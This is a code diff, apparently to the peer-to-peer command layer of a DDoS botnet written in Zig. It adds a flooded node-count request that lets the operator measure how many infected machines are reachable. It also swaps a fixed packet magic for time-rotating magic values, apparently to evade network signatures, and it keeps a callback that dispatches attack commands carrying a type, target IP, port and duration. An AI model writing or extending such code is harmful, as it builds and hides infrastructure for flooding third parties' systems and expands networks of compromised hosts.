@@ -57,6 +57,10 @@ pub const P2P = struct {
     nonce_buffer: [NONCE_BUFFER_SIZE]u32,
     nonce_index: usize,
 
+    // Cache for seen count requests (deduplication)
+    seen_requests: [32]u32,
+    seen_req_index: usize,
+
     // Callback for handling verified commands
     on_command: ?*const fn (attack_type: u8, ip: u32, port: u16, duration: u32) void,
     // Callback for broadcasting to edge subscribers
@@ -93,6 +97,8 @@ pub const P2P = struct {
             .neighbor_count = 0,
             .nonce_buffer = [_]u32{0} ** NONCE_BUFFER_SIZE,
             .nonce_index = 0,
+            .seen_requests = [_]u32{0} ** 32,
+            .seen_req_index = 0,
             .on_command = null,
             .on_broadcast = null,
         };
@@ -173,11 +179,17 @@ pub const P2P = struct {
         const header = @as(*const protocol.WireP2PHeader, @ptrCast(@alignCast(&buffer)));
         const magic = std.mem.bigToNative(u32, header.magic);
 
-        if (magic == protocol.WIRE_P2P_MAGIC) {
+        // Accept current or previous time slot magic for tolerance
+        const current_magic = crypto.magic.p2pMagic();
+        const prev_magic = crypto.magic.p2pMagicPrev();
+
+        if (magic == current_magic or magic == prev_magic) {
             if (header.type == protocol.WIRE_P2P_TYPE_GOSSIP) {
                 self.handleGossip(buffer[0..len]);
             } else if (header.type == protocol.WIRE_P2P_TYPE_CMD) {
                 self.handleCommand(buffer[0..len]);
+            } else if (header.type == protocol.WIRE_P2P_TYPE_COUNT_REQ) {
+                self.handleCountRequest(buffer[0..len], src_addr);
             }
         } else if (magic == protocol.WIRE_CONFIG_MAGIC) {
             self.handleConfigUpdate(buffer[0..len]);
@@ -244,6 +256,66 @@ pub const P2P = struct {
         self.propagate(data, 3);
     }
 
+    // ============================================================
+    // COUNT REQUEST HANDLER
+    // ============================================================
+    // CountRequest: [Magic(4)][Type=3(1)][ReqID(4)][TTL(1)][OriginIP(4)][OriginPort(2)]
+    // CountResponse: [Magic(4)][Type=4(1)][ReqID(4)][NodeCount(4)]
+
+    fn handleCountRequest(self: *P2P, data: []const u8, src_addr: posix.sockaddr.in) void {
+        // Minimum size: magic(4) + type(1) + req_id(4) + ttl(1) + origin_ip(4) + origin_port(2) = 16
+        if (data.len < 16) return;
+
+        const req_id = std.mem.readInt(u32, data[5..9], .big);
+        const ttl = data[9];
+        const origin_ip = std.mem.readInt(u32, data[10..14], .big);
+        const origin_port = std.mem.readInt(u16, data[14..16], .big);
+
+        // Check if we've seen this request before
+        for (self.seen_requests) |seen_id| {
+            if (seen_id == req_id) return; // Already processed
+        }
+
+        // Add to seen cache (circular buffer)
+        self.seen_requests[self.seen_req_index] = req_id;
+        self.seen_req_index = (self.seen_req_index + 1) % 32;
+
+        // Send response back to origin
+        var resp_buf: [13]u8 = undefined;
+        std.mem.writeInt(u32, resp_buf[0..4], std.mem.nativeToBig(u32, crypto.magic.p2pMagic()), .little);
+        resp_buf[4] = protocol.WIRE_P2P_TYPE_COUNT_RESP;
+        std.mem.writeInt(u32, resp_buf[5..9], std.mem.nativeToBig(u32, req_id), .little);
+        std.mem.writeInt(u32, resp_buf[9..13], std.mem.nativeToBig(u32, @as(u32, @intCast(self.neighbor_count))), .little);
+
+        var origin_addr: posix.sockaddr.in = .{
+            .family = posix.AF.INET,
+            .port = std.mem.nativeToBig(u16, origin_port),
+            .addr = std.mem.nativeToBig(u32, origin_ip),
+        };
+        _ = posix.sendto(self.sock, &resp_buf, 0, @ptrCast(&origin_addr), @sizeOf(posix.sockaddr.in)) catch {};
+
+        // Forward to neighbors if TTL > 0
+        if (ttl > 0) {
+            var fwd_buf: [16]u8 = undefined;
+            @memcpy(fwd_buf[0..16], data[0..16]);
+            fwd_buf[9] = ttl - 1; // Decrement TTL
+
+            // Forward to neighbors (not back to sender)
+            for (self.table) |n| {
+                if (n.is_active) {
+                    if (n.ip != src_addr.addr or n.port != src_addr.port) {
+                        var dest: posix.sockaddr.in = .{
+                            .family = posix.AF.INET,
+                            .port = n.port,
+                            .addr = n.ip,
+                        };
+                        _ = posix.sendto(self.sock, &fwd_buf, 0, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};
+                    }
+                }
+            }
+        }
+    }
+
     fn handleConfigUpdate(self: *P2P, data: []const u8) void {
         if (data.len < @sizeOf(protocol.WireSignedConfigUpdate)) return;
 
@@ -288,7 +360,7 @@ pub const P2P = struct {
         var buffer: [1024]u8 = undefined;
 
         // Header
-        std.mem.writeInt(u32, buffer[0..4], std.mem.nativeToBig(u32, protocol.WIRE_P2P_MAGIC), .little);
+        std.mem.writeInt(u32, buffer[0..4], std.mem.nativeToBig(u32, crypto.magic.p2pMagic()), .little);
         buffer[4] = protocol.WIRE_P2P_TYPE_GOSSIP;
 
         // Serialize neighbors
